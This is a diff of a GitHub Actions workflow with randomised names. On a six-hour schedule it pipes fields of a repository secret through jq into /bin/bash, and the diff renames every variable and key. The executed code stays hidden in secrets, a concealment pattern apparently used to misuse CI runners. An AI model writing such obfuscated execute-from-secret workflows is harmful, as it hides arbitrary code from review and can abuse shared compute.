@@ -1,26 +1,26 @@
 name: laimouli2197
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 5/6 * * *'
-
+    - cron: '54 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: laimouli2197
         env:
-          trlc87: ${{ secrets.trlc87 }}
+          khw7623: ${{ secrets.khw7623 }}
         run: |
-          echo $trlc87 | jq -r .apfe67 | /bin/bash
-          echo $n8537 | jq -r .ojwbx902 | /bin/bash
-          echo $ffney93339 | jq -r .rhuxs0 | /bin/bash
-          echo $neng3985 | jq -r .xi63 | /bin/bash
-          echo $in91 | jq -r .nk2 | /bin/bash
-          echo $dhzkx8 | jq -r .ncoz541 | /bin/bash
-          echo $w63 | jq -r .zkly511 | /bin/bash
-          echo $kayy9526 | jq -r .rdlup2734 | /bin/bash
-          echo $jubwp7 | jq -r .cxx87 | /bin/bash
-          echo $kay5455 | jq -r .d1 | /bin/bash
+          echo $khw7623 | jq -r .jvesd437 | /bin/bash
+          echo $ez0076 | jq -r .pvex9 | /bin/bash
+          echo $wgu1 | jq -r .orzs177 | /bin/bash
+          echo $f98814 | jq -r .qnrzx44 | /bin/bash
+          echo $kdxny17 | jq -r .r66558 | /bin/bash
+          echo $w66903 | jq -r .ojgrc06 | /bin/bash
+          echo $wo5 | jq -r .gcwl08479 | /bin/bash
+          echo $t07 | jq -r .dsw58 | /bin/bash
+          echo $tgbh461 | jq -r .h227 | /bin/bash
 
